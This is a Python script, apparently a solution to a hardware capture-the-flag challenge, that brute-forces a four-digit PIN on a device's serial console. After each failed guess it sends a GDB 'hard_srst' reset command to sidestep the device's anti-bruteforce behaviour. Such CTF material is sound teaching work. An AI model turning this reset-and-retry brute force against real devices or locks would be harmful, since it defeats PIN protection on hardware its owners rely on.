#!/usr/bin/env python3

# Copyright 2020, Verizon Media
# Licensed under the terms of the MIT license. See LICENSE file in project root for terms.

# Ensure the device is at the main prompt

import serial
from serial_port_util import CTFSerial
import sys
import queue
import threading
import time

from gdb_monitor_console import GDBConnection

if len(sys.argv) < 3:
    print("Usage: {} gdb_serport con_serport <start at>".format(sys.argv[0]))
    sys.exit(1)

gdb_serport = sys.argv[1]
gdb = GDBConnection(gdb_serport, lambda x: print(x))

con_serport = sys.argv[2]
conser = CTFSerial(con_serport)

if len(sys.argv) >= 4:
    start_at = int(sys.argv[3])
else:
    start_at = 0

time.sleep(5)

for pin in range(start_at, 10000):
    print("Trying {:04d}".format(pin))

    ok = conser.write_and_check(b"start 2\n")
    expected_reply = b"Entering Level 2 - \"Stop bruteforcing me!\"\r\n\r\nWhile you were working on the safe, it received an \"OTA firmware update.\"\r\nEnter PIN: "
    reply = conser.read(len(expected_reply))
    # assert reply == expected_reply
    if not ok or reply != expected_reply:
        print(reply)
        conser.ser.timeout = 5
        print(conser.read(2))
        conser.ser.timeout = 1

    pinstr = "{:04d}\n".format(pin).encode('ascii')
    ok = conser.write_and_check(pinstr)
    assert ok
    time.sleep(0.001)

    if conser.ser.in_waiting:
        print("That was the correct PIN!")
        break
    else:
        conser.ser.reset_input_buffer()
        gdb.send_monitor_command(b'hard_srst')
        reply = conser.read(2)
        # assert reply == b'> '
        if reply != b'> ':
            print(reply)
            conser.ser.timeout = 5
            print(conser.read(2))
            conser.ser.timeout = 1

gdb.shutdown()
